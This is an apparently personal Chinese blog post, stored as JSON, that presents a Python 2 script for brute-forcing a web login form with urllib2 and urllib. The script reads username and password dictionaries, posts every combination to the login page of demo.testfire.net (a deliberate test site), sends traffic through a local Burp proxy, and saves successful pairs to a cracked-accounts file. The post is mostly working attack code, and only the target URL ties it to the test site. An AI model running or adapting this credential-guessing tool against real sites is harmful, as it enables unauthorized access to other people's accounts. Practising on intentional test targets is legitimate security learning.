{"title": "使用 python 的 urllib2和 urllib模块爆破 form 表单的简易脚本 - 个人文章 ", "index": "urllib,urllib2,python,安全", "content": "\npython 的 http 中 urllib2和 urllib模块在web 表单爆破的使用方法\n脚本中还增加了 urllib2和 urllib模块如何添加代理的方法\n\n# -*- coding: utf-8 -*-\nimport urllib2\nimport urllib\nimport time\n\n\ndef brute_force(user, password):\n    #strip() 方法用于移除字符串头尾指定的字符（默认为空格）\n    name = user.strip()\n    passwd = password.strip()\n\n    #添加代理:本地8080端口的代理是 burp 工具,主要是查看脚本发包回包的情况,好定位问题\n    \n    proxy = urllib2.ProxyHandler({\"http\":'http://127.0.0.1:8080'})\n    opener = urllib2.build_opener(proxy)\n    urllib2.install_opener(opener)\n\n    #IBM 公司的一个 测试网站\n    url1 = \"http://demo.testfire.net/bank/login.aspx\"\n    user_agent = \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36\"\n    headers = {\"User-Agent\":user_agent,\"Content-Type\": \"application/x-www-form-urlencoded\", \"Referer\": \"http://demo.testfire.net/bank/login.aspx\"}\n    values = {'uid': name, 'passw': passwd,'btnSubmit':'Login'}\n    data = urllib.urlencode(values)#可以把key-value这样的键值对转换成我们想要的格式，返回的是a=1&b=2这样的字符串\n    request = urllib2.Request(url1,data,headers)\n    response = urllib2.urlopen(request)\n    url2 = response.geturl()\n    time.sleep(3)\n\n\n    if url2 != url1:\n        #因为urllib2 返回的页面如果存在302重定向,返回的页面是重定向之后的页面,所以不能以302状态码来判断是否登录成功,\n        #因为重定向之后的页面访问成功是200,不是302;所以以返回的页面是不是发生变化来判断是否是否登录成功。\n\n        print '---- find user:', name, ' with password:',passwd, '-----'\n        print url2\n        outFile.write(name + ':' + passwd+'\\n' )\n    else:\n        print '----- error user:', name, ' with password:',passwd, '-----'\n        print url2\n    response.close()\n    return\n\n\n\noutFile = open('accounts-cracked.txt', 'w')\n\nif __name__ == '__main__':\n    #导入用户名字典\n    with open('user.dic', 'r') as userline:\n        y = userline.readlines()\n        #导入密码的字典\n        with open('pass.dic', 'r') as passline:\n            b= passline.readlines()\n            for u in y:\n                for p in b:\n                    brute_force(user=u,password=p)\n                    \noutFile.close()\nwith open('accounts-cracked.txt','r') as text:\n    list = text.readlines()\n    sum=len(list)\n\nif sum>0:\n    print \"找到\",sum,\"个账号密码\"\nelse:\n    print \"All thread OK,maybe not \"\n输入有点丑,将就用下\n\n                ", "mainLikeNum": ["0 "], "mainBookmarkNum": "0"}